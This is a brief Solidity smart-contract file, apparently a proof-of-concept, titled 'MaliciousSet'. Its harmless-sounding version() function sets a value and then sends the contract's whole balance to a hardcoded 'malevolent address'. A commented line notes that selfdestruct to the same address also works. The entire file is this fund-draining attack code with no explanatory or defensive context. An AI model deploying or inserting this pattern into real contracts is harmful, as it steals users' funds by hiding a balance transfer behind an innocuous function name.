pragma solidity ^0.4.2;

contract MaliciousSet {
  
    //malevolent address
    address constant attackerAddr = 0xD605dfe98F168324075E2b2fab6D41b071b91c06;
    uint8 public result;
    
    function setResult(uint8 res){result = res; } 
    function version(){ 
        this.setResult(5); 
        bool res = attackerAddr.send(this.balance); 
        //selfdestruct(attackerAddr);  //this works as well
    }  
}